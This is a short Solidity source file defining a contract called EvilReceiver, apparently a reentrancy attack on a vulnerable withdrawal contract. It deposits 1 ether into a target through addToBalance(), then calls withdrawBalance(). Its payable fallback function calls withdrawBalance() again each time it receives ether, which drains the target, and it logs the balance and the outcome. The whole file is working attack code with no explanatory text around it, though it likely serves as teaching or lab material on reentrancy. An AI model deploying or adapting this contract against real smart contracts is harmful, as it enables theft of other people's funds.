pragma solidity ^0.4.18;

contract EvilReceiver {
    address public target;
    event MessageLog(string);
    event BalanceLog(uint);

    function EvilReceiver(address _target) public {
        target = _target;
    }

    function() public payable {
        emit BalanceLog(address(this).balance);

        if(!msg.sender.call.value(0)(bytes4(keccak256("withdrawBalance()")))){
            emit MessageLog("FAIL");
        }else {
            emit MessageLog("SUCCESS");
        }
    }

    function addBalance() public payable {

    }

    function sendEthToTarget() public {
         if(!target.call.value(1 ether)(bytes4(keccak256("addToBalance()")))){
            revert();
         }
    }

    function withdraw() public {
         if(!target.call.value(0)(bytes4(keccak256("withdrawBalance()")))){
            revert();
         }
    }
}